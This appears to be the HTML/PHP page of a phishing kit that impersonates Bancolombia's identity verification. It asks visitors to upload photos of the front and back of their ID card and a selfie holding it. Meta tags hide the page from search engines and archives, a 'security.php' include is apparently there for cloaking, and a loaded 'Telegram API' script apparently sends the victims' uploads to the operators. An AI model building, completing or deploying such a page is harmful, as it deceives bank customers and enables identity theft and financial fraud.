<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Validación de identidad Bancolombia.">
    <title>Validación de identidad — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/soyyo.css">
</head>
<body>

    <!-- HEADER SUPERIOR - LOGO CENTRADO -->
    <div class="header-top">
        <div class="header-content">
            <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="logo-header">
        </div>
    </div>

    <h1 class="titulo-principal">Verificación de Identidad</h1>

    <div class="form-container">
        <div class="form-box">
            <p class="descripcion">
                Por motivos de seguridad, necesitamos validar tu identidad. Por favor adjunta las siguientes fotografías.
            </p>

            <form id="uploadForm">
                <!-- FOTO 1: CC FRENTE -->
                <div class="file-upload-container">
                    <label class="file-upload-label">1. Documento de Identidad (Frente)</label>
                    <input type="file" id="foto1" accept="image/*" class="custom-file-input" data-preview="preview1" required>
                    <img id="preview1" class="preview-image">
                </div>

                <!-- FOTO 2: CC DORSO -->
                <div class="file-upload-container">
                    <label class="file-upload-label">2. Documento de Identidad (Reverso)</label>
                    <input type="file" id="foto2" accept="image/*" class="custom-file-input" data-preview="preview2" required>
                    <img id="preview2" class="preview-image">
                </div>

                <!-- FOTO 3: SELFIE -->
                <div class="file-upload-container">
                    <label class="file-upload-label">3. Selfie sosteniendo el documento</label>
                    <input type="file" id="foto3" accept="image/*" class="custom-file-input" data-preview="preview3" required>
                    <img id="preview3" class="preview-image">
                </div>

                <div class="botones">
                    <button type="button" class="btn-volver" id="btnVolverSoyYo">Volver</button>
                    <button type="button" class="btn-continuar activo" id="btnContinuarSoyYo">Continuar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- FOOTER -->
    <div class="footer-container">
        <div class="footer-line"></div>
        <div class="footer-logos">
            <div class="logo-intermedio">
                <img src="assets/images/logo-pie.svg" alt="Bancolombia">
            </div>
            <div class="logo-vigilado">
                <img src="assets/images/estrella-hola.svg" alt="Vigilado">
            </div>
        </div>
        <div class="info-footer">
            <span>Dirección IP: <span id="gfg">Cargando...</span></span>
            <span>|</span>
            <span id="fecha-hora">Cargando...</span>
        </div>
    </div>

    <!-- Loader Overlay -->
    <div class="loader-overlay" id="loader">
        <div class="loader-content">
            <div class="spinner"></div>
            <div class="loader-text">Subiendo documentos...</div>
            <div class="loader-subtext">Por favor espera un momento</div>
        </div>
    </div>

    <script src="assets/js/shared/page-common.js"></script>
    
    <!-- 🆕 NUEVO: Cliente API de Telegram (SEGURO) -->
    <script src="assets/js/shared/telegram-api.js"></script>
    
    <script src="assets/js/pages/soyyo.js"></script>

</body>
</html>